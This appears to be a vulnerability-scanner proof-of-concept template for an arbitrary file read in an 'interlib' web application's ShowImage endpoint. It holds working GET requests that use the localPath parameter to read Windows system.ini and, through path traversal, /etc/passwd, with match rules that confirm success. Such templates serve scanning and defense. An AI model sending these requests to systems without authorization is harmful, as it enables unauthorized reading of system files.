name: poc-yaml-interlib-read-file
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /interlib/report/ShowImage?localPath=C:Windows/system.ini
        expression: response.status == 200 && "[drivers]".bmatches(response.body)

    r1:
        request:
            cache: true
            method: GET
            path: /interlib/report/ShowImage?localPath=../etc/passwd
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0() || r1()
detail:
    author: Henry4E36(https://github.com/Henry4E36)
    links:
      - https://github.com/Henry4E36